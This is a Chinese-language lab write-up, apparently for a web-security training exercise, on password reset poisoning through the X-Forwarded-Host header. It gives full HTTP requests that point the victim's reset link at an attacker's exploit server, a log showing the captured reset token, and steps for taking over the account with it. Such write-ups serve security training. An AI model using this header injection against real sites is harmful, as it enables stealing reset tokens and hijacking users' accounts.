# 实验：通过中间件进行密码重置投毒

本实验存在密码重置投毒漏洞。用户 `carlos` 会粗心大意地点击他收到的电子邮件中的任何链接。为了解决本实验，请登录 Carlos 的账户。你可以使用以下凭据登录自己的账户：`wiener:peter`。发送到此账户的任何电子邮件都可以通过利用服务器上的电子邮件客户端阅读。

## 步骤

查看 `HTTP 头部攻击 - 密码重置投毒` 小节，得到一批覆盖 host 头部
- 使用 `X-Forwarded-Host` 头部
    ```http
    POST /forgot-password HTTP/2
    Host: 0a7e002b040f3297801d586a005a009a.web-security-academy.net
    X-Forwarded-Host: exploit-0a520072041a32808043574a01960008.exploit-server.net

    username=wiener
    ```

- 邮件的链接被设置为攻击者域名
    `https://exploit-0a520072041a32808043574a01960008.exploit-server.net/forgot-password?temp-forgot-password-token=kait8rrzmyjrs7o27u7bmmoh36idm18t`


尝试向目标用户发送投毒后的重置密码邮件
- 请求
    ```http
    POST /forgot-password HTTP/2
    Host: 0a7e002b040f3297801d586a005a009a.web-security-academy.net
    X-Forwarded-Host: exploit-0a520072041a32808043574a01960008.exploit-server.net

    username=carlos
    ```

- 查看攻击服务器 log
    ```log
    10.0.4.50       2026-08-13 10:49:20 +0000 "GET /forgot-password?temp-forgot-password-token=x1rew4h875p8neiwoa58gas1bl520kna HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ```

- 目标用户访问了投毒的链接，从而泄露重置密码令牌

- 使用窃取的重置令牌访问密码重置端点
    `https://0a7e002b040f3297801d586a005a009a.web-security-academy.net/forgot-password?temp-forgot-password-token=x1rew4h875p8neiwoa58gas1bl520kna`

    - 成功返回密码修改表单

- 设置新密码后，使用新凭据登录目标用户账户
